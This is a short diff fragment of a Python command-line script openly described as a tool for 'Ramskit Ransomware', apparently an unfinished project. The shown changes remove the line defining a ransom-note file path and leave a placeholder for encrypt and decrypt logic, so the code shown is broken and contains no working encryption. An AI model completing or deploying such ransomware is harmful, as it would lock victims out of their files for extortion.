@@ -22,8 +22,6 @@ import sys
 import argparse
 
 
-current_version = "v1.0.0"
-
 # TODO 1: Implement Ramskit classls
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
@@ -38,8 +36,7 @@ if __name__ == '__main__':
     action = args.action.lower()
     path = args.path
 
-    lam = os.path.join(path, 'look_at_me.txt')
-
+    # FIXME 2: Encrypt/decrypt
     if action == 'encrypt':
         with open(lam, 'w') as f:
             f.write('''
